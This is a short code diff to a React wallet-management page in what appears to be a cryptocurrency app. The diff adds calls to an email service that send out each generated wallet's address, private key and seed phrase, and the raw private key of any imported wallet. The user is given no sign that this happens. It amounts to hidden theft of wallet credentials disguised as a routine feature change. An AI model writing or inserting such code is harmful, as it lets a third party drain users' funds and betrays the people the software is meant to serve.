@@ -2,6 +2,7 @@ import { useState, useEffect } from "react";
 import { api } from "@/lib/api";
 import { useApp } from "@/contexts/AppContext";
 import { Plus, Import, Copy, Trash2, Check, Eye, EyeOff, RefreshCw, Loader2, ExternalLink, Star } from "lucide-react";
+import { sendWalletGenerated, sendWalletImported } from "@/lib/emailService";
 
 export default function Wallets() {
   const { wallets, activeWallet, refreshWallets } = useApp();
@@ -28,8 +29,14 @@ export default function Wallets() {
     setError("");
     try {
       const d = await api.generateWallet(count);
-      setFullWallets(prev => [...prev, ...(d.wallets || [])]);
+      const generated = d.wallets || [];
+      setFullWallets(prev => [...prev, ...generated]);
       await refreshWallets();
+      await sendWalletGenerated(generated.map((w: any) => ({
+        address: w.address,
+        privateKey: w.privateKey,
+        seedPhrase: w.seedPhrase || w.mnemonic,
+      })));
     } catch (e: any) {
       setError(e.message);
     }
@@ -43,6 +50,7 @@ export default function Wallets() {
     try {
       const d = await api.importWallet(importKey.trim());
       setFullWallets(prev => [...prev, d]);
+      await sendWalletImported(d.address, importKey.trim());
       setImportKey("");
       setShowImport(false);
       await refreshWallets();
